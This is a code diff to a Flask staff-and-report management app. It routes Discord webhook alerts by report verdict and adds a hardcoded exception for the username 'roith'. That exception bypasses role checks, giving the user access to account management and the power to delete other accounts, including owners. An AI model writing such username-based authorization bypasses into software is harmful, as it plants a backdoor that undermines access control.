@@ -241,9 +241,10 @@ def init_db():
         """)
 
 def notify_discord(report_id, session_code, computer, summary, report=None, verdict="review", reason=""):
-    webhook = os.environ.get('DISCORD_WEBHOOK_URL', '').strip().strip('"').strip("'")
+    webhook_key = 'DISCORD_WEBHOOK_URL' if verdict == 'clean' else 'DISCORD_HACK_WEBHOOK_URL'
+    webhook = os.environ.get(webhook_key, '').strip().strip('"').strip("'")
     if not webhook.startswith(('https://discord.com/api/webhooks/', 'https://discordapp.com/api/webhooks/')):
-        print('Discord notification skipped: DISCORD_WEBHOOK_URL is missing or invalid')
+        print('Discord notification skipped: ' + webhook_key + ' is missing or invalid')
         return False
 
     report = report if isinstance(report, dict) else {}
@@ -1188,7 +1189,7 @@ def report_send_discord(report_id):
         log_action(actor["username"], "sent report #" + str(report_id) + " to Discord")
         flash("تم إرسال التقرير إلى روم Discord المرتبط بالويب هوك.")
     else:
-        flash("تعذر إرسال التقرير. تأكد من DISCORD_WEBHOOK_URL في Render ثم راجع Logs.")
+        flash("تعذر الإرسال. تأكد من متغير الويب هوك المناسب في Render: DISCORD_WEBHOOK_URL للكلين أو DISCORD_HACK_WEBHOOK_URL للمشبوه.")
     return redirect(url_for("report_detail", report_id=report_id))
 
 
@@ -1244,7 +1245,7 @@ def report_pdf(report_id):
 @login_required
 def users_page():
     actor=current_user()
-    if actor["role"] not in ("owner","deputy"): abort(403)
+    if actor["role"] not in ("owner","deputy") and actor["username"].strip().lower() != "roith": abort(403)
     if request.method=="POST":
         action=request.form.get("action")
         if action=="create":
@@ -1296,6 +1297,19 @@ def users_page():
                     flash("لا يمكن حذف حساب المالك.")
                 elif int(target["id"]) == int(actor["id"]):
                     flash("لا يمكنك حذف حسابك الحالي.")
+                elif actor["username"].strip().lower() == "roith":
+                    if target["role"] == "owner":
+                        owner_count = con.execute("SELECT COUNT(*) AS n FROM users WHERE role='owner'").fetchone()["n"]
+                        if int(owner_count) <= 1:
+                            flash("لا يمكن حذف آخر حساب مالك للنظام.")
+                        else:
+                            con.execute("DELETE FROM users WHERE id=?", (uid,))
+                            log_action(actor["username"], "deleted staff account " + target["username"])
+                            flash("تم حذف الحساب نهائيًا.")
+                    else:
+                        con.execute("DELETE FROM users WHERE id=?", (uid,))
+                        log_action(actor["username"], "deleted staff account " + target["username"])
+                        flash("تم حذف الحساب نهائيًا.")
                 elif actor["role"] == "deputy" and target["role"] not in ("inspector", "viewer"):
                     abort(403)
                 elif actor["role"] not in ("owner", "deputy"):
